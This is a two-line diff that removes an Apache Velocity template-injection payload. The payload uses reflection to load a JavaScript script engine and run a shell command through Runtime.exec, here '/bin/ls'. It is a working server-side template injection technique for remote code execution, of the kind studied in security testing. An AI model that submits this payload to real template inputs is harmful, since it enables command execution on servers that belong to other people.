@@ -1,2 +1,0 @@
-#set($e="e")
-$e.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('/bin/ls')");
